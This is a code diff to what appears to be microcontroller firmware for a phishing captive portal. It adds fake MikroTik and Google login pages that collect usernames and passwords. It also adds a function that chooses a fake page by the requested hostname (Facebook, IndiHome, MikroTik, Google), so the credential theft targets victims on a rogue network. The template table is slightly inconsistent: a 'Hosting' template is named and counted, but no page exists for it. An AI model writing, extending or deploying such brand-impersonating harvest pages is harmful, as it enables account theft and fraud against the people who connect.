@@ -155,11 +155,80 @@ button{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-
 </body></html>
 )rawliteral";
 
+
+// ------------------------------------------------------------------
+// Template 3: MIKROTIK
+// ------------------------------------------------------------------
+const char html_mikrotik[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MikroTik Login</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Arial;background:#222;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{background:#fff;border-radius:8px;width:340px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.4)}
+.hdr{background:#29323d;color:#fff;padding:22px;text-align:center}
+.logo{font-size:22px;font-weight:bold;letter-spacing:1px}
+.sub{font-size:12px;opacity:.8;margin-top:4px}
+.body{padding:26px}
+input{width:100%;padding:11px;margin:8px 0;border:1px solid #ccc;border-radius:5px;font-size:14px}
+button{width:100%;padding:12px;background:#29323d;color:#fff;border:none;border-radius:5px;font-size:15px;font-weight:bold;margin-top:10px;cursor:pointer}
+#loading{display:none;text-align:center;padding:20px}
+.spin{border:4px solid #f3f3f3;border-top:4px solid #29323d;border-radius:50%;width:40px;height:40px;animation:sp 1s linear infinite;margin:15px auto}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style></head><body>
+<div class="card">
+<div class="hdr"><div class="logo">MikroTik</div><div class="sub">RouterOS Login</div></div>
+<div class="body">
+<div id="f"><form action="/login" method="POST" onsubmit="sh()">
+<input name="email" placeholder="Username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button>Login</button></form></div>
+<div id="loading"><div class="spin"></div><p style="font-weight:bold">Connecting...</p></div>
+</div></div>
+<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
+</body></html>
+)rawliteral";
+
+// ------------------------------------------------------------------
+// Template 4: GOOGLE
+// ------------------------------------------------------------------
+const char html_google[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Google - Sign in</title>
+<style>
+*{box-sizing:border-box}body{margin:0;font-family:Roboto,Arial;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh}
+.card{width:360px;padding:32px;border:1px solid #dadce0;border-radius:8px}
+.logo{text-align:center;margin-bottom:16px}
+.logo span{font-size:28px}
+.g1{color:#4285f4}.g2{color:#ea4335}.g3{color:#fbbc05}.g4{color:#34a853}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px}
+.sub{font-size:16px;color:#202124;text-align:center;margin:0 0 24px}
+input{width:100%;padding:14px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+button{width:100%;padding:11px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;margin-top:16px;cursor:pointer}
+#loading{display:none;text-align:center;padding:20px}
+.spin{border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;width:36px;height:36px;animation:sp 1s linear infinite;margin:15px auto}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style></head><body>
+<div class="card">
+<div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g2">l</span><span class="g1">e</span></div>
+<h1>Sign in</h1>
+<p class="sub">Use your Google Account</p>
+<div id="f"><form action="/login" method="POST" onsubmit="sh()">
+<input name="email" placeholder="Email or phone" required>
+<input type="password" name="password" placeholder="Enter your password" required>
+<button>Next</button></form></div>
+<div id="loading"><div class="spin"></div><p style="color:#1a73e8">Signing in...</p></div>
+</div>
+<script>function sh(){document.getElementById('f').style.display='none';document.getElementById('loading').style.display='block';}</script>
+</body></html>
+)rawliteral";
+
 inline const char* getTemplate(int idx) {
   switch (idx) {
     case 0: return html_generic;
     case 1: return html_indihome;
     case 2: return html_facebook;
+    case 3: return html_mikrotik;
+    case 4: return html_google;
     default: return html_generic;
   }
 }
@@ -169,10 +238,23 @@ inline const char* getTemplateName(int idx) {
     case 0: return "Generic";
     case 1: return "IndiHome";
     case 2: return "Facebook";
+    case 3: return "MikroTik";
+    case 4: return "Google";
+    case 5: return "Hosting";
     default: return "Generic";
   }
 }
 
-const int TEMPLATE_COUNT = 3;
+inline const char* getTemplateForHost(const String& host, int fallbackIdx) {
+  String h = host;
+  h.toLowerCase();
+  if (h.indexOf("facebook") >= 0) return html_facebook;
+  if (h.indexOf("indihome") >= 0) return html_indihome;
+  if (h.indexOf("mikrotik") >= 0) return html_mikrotik;
+  if (h.indexOf("google") >= 0 || h.indexOf("gstatic") >= 0 || h.indexOf("gmail") >= 0) return html_google;
+  return getTemplate(fallbackIdx);
+}
+
+const int TEMPLATE_COUNT = 6;
 
 #endif
